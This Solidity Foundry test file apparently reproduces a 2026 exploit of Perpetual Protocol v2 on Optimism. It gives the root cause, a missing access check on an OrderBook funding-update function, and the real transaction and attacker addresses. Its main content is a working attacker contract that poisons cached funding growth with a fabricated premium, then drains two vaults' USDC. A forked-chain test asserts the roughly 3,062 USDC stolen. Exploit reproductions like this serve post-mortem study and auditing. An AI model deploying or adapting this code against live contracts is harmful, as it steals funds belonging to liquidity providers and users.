// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Perpetual Protocol v2 (Curie) - missing access-control guard on
// OrderBook.updateFundingGrowthAndLiquidityCoefficientInFundingPayment(). Optimism, Jul 2026.
// ~3,062.21 USDC.e drained across two perp deployments in one tx.
//
// Exploit tx : 0xb0a8a3cc76fb17bf965ab1dee3b76b62f79ca72def31e12f8ad8b1711625df08 (block 154311432)
// Attacker   : 0x957c6cF5E0F69597dB7A8065c94af1A48aBCA47d (deployed a one-shot attack contract)
//
// Root cause (confirmed against the verified OrderBook implementation 0xa0D9966d, source on
// sourcify): every state-changing OrderBook entrypoint calls `_requireOnlyClearingHouse()` -
// addLiquidity (line 99), removeLiquidity (178), replaySwapInternal (200), updateOrderDebt (275) -
// EXCEPT `updateFundingGrowthAndLiquidityCoefficientInFundingPayment` (line 232), whose body runs
// straight into reading the trader's open orders and applying the CALLER-SUPPLIED
// `fundingGrowthGlobal.twPremiumX96` to their cached funding growth, with no caller check. It is
// `external`, so anyone can call it for their own account. (The guard at line 275 belongs to the
// next function, updateOrderDebt, not to this one - verified by reading the full 232-268 body.)
//
// Attack, per market (exact values from the real tx trace):
//   1. ClearingHouse.addLiquidity() a dust order (base=2, quote=1 wei) so the account has a cached
//      open order (normal public user path, needs ~no collateral at 2 wei).
//   2. Call the UNGUARDED OrderBook.updateFundingGrowthAndLiquidityCoefficientInFundingPayment(self,
//      baseToken, Funding.Growth(twPremiumX96 = 1e70, 0)) DIRECTLY, poisoning the order's cached
//      funding growth with a fabricated ~1e70 premium.
//   3. Vault.withdraw(USDC) - withdraw triggers settleAllFunding, which turns the poisoned cache
//      into a enormous bogus funding payment / realized PnL, inflating free collateral so the whole
//      vault balance is withdrawable. The real USDC paid out belongs to the other LPs.
// Done against two deployments in one tx: vault 0x28bB.. (71.777612 USDC) + vault 0xf127..
// (2990.435495 USDC) = 3,062.213107 USDC to the attacker.
//
// Permissionless: the attacker is a fresh account using only public user paths (addLiquidity /
// withdraw via ClearingHouse+Vault) plus the one unguarded OrderBook function. No admin/owner/
// governance/role/signature step stands between the attacker and the exploited function.
//
// This reconstruction drives the real contracts with typed calls (no create()-deployed bytecode,
// no raw calldata). The attack contract is the trader, so addLiquidity/poison/withdraw all act on
// one consistent account, exactly as the real one-shot contract did.
//
// Run (self-contained Optimism archive fork; add --evm-version cancun if a frameless NotActivated hits):
//   forge test --contracts ./src/test/2026-10/PerpetualProtocol_exp.sol --evm-version cancun -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IClearingHouse {
    struct AddLiquidityParams {
        address baseToken;
        uint256 base;
        uint256 quote;
        int24 lowerTick;
        int24 upperTick;
        uint256 minBase;
        uint256 minQuote;
        bool useTakerBalance;
        uint256 deadline;
    }
    function addLiquidity(AddLiquidityParams calldata params) external returns (uint256, uint256, uint256);
}

interface IOrderBook {
    struct Growth {
        int256 twPremiumX96;
        int256 twPremiumDivBySqrtPriceX96;
    }
    function updateFundingGrowthAndLiquidityCoefficientInFundingPayment(
        address trader,
        address baseToken,
        Growth calldata fundingGrowthGlobal
    ) external returns (int256);
}

interface IVault {
    function withdraw(address token, uint256 amount) external;
}

contract PerpAttacker {
    IERC20 internal constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    int256 internal constant POISON_TW_PREMIUM = 1e70; // fabricated twPremiumX96 from the real tx

    function hit(
        address clearingHouse,
        address orderBook,
        address vault,
        address baseToken,
        int24 lowerTick,
        int24 upperTick
    ) external {
        // 1. Create a cached dust order through the normal ClearingHouse path.
        IClearingHouse(clearingHouse).addLiquidity(
            IClearingHouse.AddLiquidityParams({
                baseToken: baseToken,
                base: 2,
                quote: 1,
                lowerTick: lowerTick,
                upperTick: upperTick,
                minBase: 0,
                minQuote: 0,
                useTakerBalance: false,
                deadline: block.timestamp
            })
        );

        // 2. Poison the order's cached funding growth via the unguarded OrderBook function.
        IOrderBook(orderBook).updateFundingGrowthAndLiquidityCoefficientInFundingPayment(
            address(this), baseToken, IOrderBook.Growth({twPremiumX96: POISON_TW_PREMIUM, twPremiumDivBySqrtPriceX96: 0})
        );

        // 3. Withdraw the whole vault against the fabricated PnL (withdraw settles funding first).
        IVault(vault).withdraw(address(USDC), USDC.balanceOf(vault));
    }

    function sweep(address to) external {
        USDC.transfer(to, USDC.balanceOf(address(this)));
    }
}

contract PerpetualProtocol_exp is Test {
    IERC20 internal constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    uint256 internal constant ATTACK_BLOCK = 154311432;
    // Exact total drained in the real tx (vault 0x28bB.. 71,777,612 + vault 0xf127.. 2,990,435,495).
    uint256 internal constant EXPECTED = 3_062_213_107;

    string internal constant OPTIMISM_ARCHIVE = "https://optimism.gateway.tenderly.co";

    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(OPTIMISM_ARCHIVE, ATTACK_BLOCK - 1);
    }

    function testExploit() public {
        PerpAttacker atk = new PerpAttacker();

        // Market 1
        atk.hit(
            0x4f7961ee13bDA96BFa9381B87D21b2Baed96F0b5, // ClearingHouse
            0x772F48F073c1f328C264619fc3bbA28e3efdEfb0, // OrderBook
            0x28bB48207C761eeD2A4aA9249083c429c719AaDB, // Vault
            0xab3F8a9599D62f09A71d7337dFfF4458a4C7fe27, // baseToken
            84120,
            84240
        );
        // Market 2
        atk.hit(
            0x8098c6273bD5F9D32d03E6cb62472a9E6608efF2,
            0x4E26b6815d82BAa6B8c15Fe4ffB646dFb4b474c7,
            0xf127fdb858F009938B4530aAC37E5Bc8e9a09C28,
            0x28D8a1a6BDEAF9d42dA6A55da8a34710e3434B97,
            83400,
            83520
        );

        atk.sweep(attacker);

        uint256 stolen = USDC.balanceOf(attacker);
        emit log_named_decimal_uint("USDC drained", stolen, 6);
        assertApproxEqRel(stolen, EXPECTED, 0.01e18);
    }
}
